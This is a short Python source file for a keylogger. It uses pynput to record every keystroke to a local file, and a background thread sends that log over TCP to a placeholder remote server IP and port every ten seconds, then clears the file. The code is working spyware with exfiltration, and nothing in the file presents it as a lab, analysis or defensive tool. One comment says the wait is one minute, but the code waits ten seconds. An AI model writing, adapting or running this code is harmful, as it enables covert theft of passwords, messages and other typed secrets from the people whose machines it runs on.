import socket
from pynput import keyboard
import threading
import time

LOG_FILE = "keylog.txt"      # Name of the log file
SERVER_IP = '<SERVER_IP>'    # Change it to the server IP
SERVER_PORT = <PORT>         # Change it to the server port

def on_press(key):
    try:
        key_data = '{0}'.format(key.char)
    except AttributeError:
        key_data = '\n{0}\n'.format(key)

    with open(LOG_FILE, "a") as f:
        f.write(key_data)

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def send_file():
    while True:
        time.sleep(10)  # Waits 1 minute 
        try:
            with open(LOG_FILE, "r") as f:
                data = f.read()
                
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((SERVER_IP, SERVER_PORT))
            client_socket.sendall(data.encode('utf-8'))
            client_socket.close()

            
            open(LOG_FILE, "w").close()
        except Exception as e:
            print(f"Error sending data: {e}")

if __name__ == "__main__":
    threading.Thread(target=send_file, daemon=True).start()

    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
